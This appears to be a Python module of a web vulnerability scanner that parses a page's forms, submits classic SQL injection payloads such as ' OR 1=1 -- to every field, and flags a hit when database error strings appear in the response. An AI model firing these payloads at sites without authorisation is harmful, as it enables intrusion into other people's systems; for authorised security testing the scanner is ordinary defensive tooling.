import re
from urllib.parse import urljoin
from colorama import Fore, Style

def scan(url, session):
    print(f"\n{Fore.BLUE}[+] Testing for SQL Injection vulnerabilities...{Fore.RESET}")
    payloads = [
        "' OR '1'='1",
        "' OR 1=1 --",
        "admin' --",
        "\" OR \"\"=\""
    ]
    vuln_found = False
    
    try:
        response = session.get(url)
        forms = re.findall(r'<form.*?</form>', response.text, re.DOTALL)
        
        for form in forms:
            action = re.search(r'action="(.*?)"', form)
            method = re.search(r'method="(.*?)"', form)
            inputs = re.findall(r'<input.*?name="(.*?)".*?>', form)
            
            if not action or not inputs:
                continue
                
            target_url = urljoin(url, action.group(1))
            method = method.group(1).lower() if method else 'get'
            
            for payload in payloads:
                data = {input_name: payload for input_name in inputs}
                
                try:
                    if method == 'post':
                        res = session.post(target_url, data=data)
                    else:
                        res = session.get(target_url, params=data)
                    
                    sql_errors = [
                        "SQL syntax",
                        "MySQL server",
                        "syntax error",
                        "unclosed quotation"
                    ]
                    
                    if any(error.lower() in res.text.lower() for error in sql_errors):
                        print(f"{Fore.RED}[!] SQLi Vulnerability found at {target_url}")
                        print(f"    Payload: {Style.BRIGHT}{payload}{Style.NORMAL}")
                        vuln_found = True
                        break
                        
                except Exception as e:
                    continue
    
    except Exception as e:
        print(f"{Fore.YELLOW}[!] SQLi Scan Error: {e}{Fore.RESET}")
    
    if not vuln_found:
        print(f"{Fore.GREEN}[✓] No SQL Injection vulnerabilities found{Fore.RESET}")
    
    return vuln_found